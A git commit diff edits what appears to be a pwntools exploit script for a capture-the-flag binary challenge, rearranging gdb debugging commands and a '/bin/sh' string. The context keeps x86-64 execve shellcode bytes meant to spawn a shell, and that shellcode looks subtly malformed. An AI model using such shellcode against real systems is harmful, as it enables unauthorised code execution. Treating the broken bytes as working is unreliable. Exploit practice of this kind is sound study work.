616b9735db0b01905aeab8e25ec2527c28bf081c
Khalil El Hage Kassem <90007227+Khalil002@users.noreply.github.com>
2025-09-30 23:26:59 +0200

    Update e.py

--- c2/e.py
+++ c2/e.py
@@ -2,7 +2,12 @@ from pwn import *
 #xor esi, esi
 #xor edx, edx
 #syscall
-s = """b cs_free
+s = """
+
+b"/bin/sh\0"
+"""
+COMMANDS = """
+b cs_free
 continue
 finish
 next
@@ -10,12 +15,6 @@ next
 si
 si
 si
-
-b"/bin/sh\0"
-"""
-COMMANDS = """
-b main
-continue
 """
 shellcode = b"\x31\xC0\x50\xB0\x2F\x50\xB0\x62\x50\xB0\x69\x50\xB0\x6E\x50\xB0\x2F\x50\xB0\x73\x50\xB0\x68\x50\xB0\x00\x50\x6A\x3B\x58\x31\xF6\x31\xD2\x0F\x05"
 
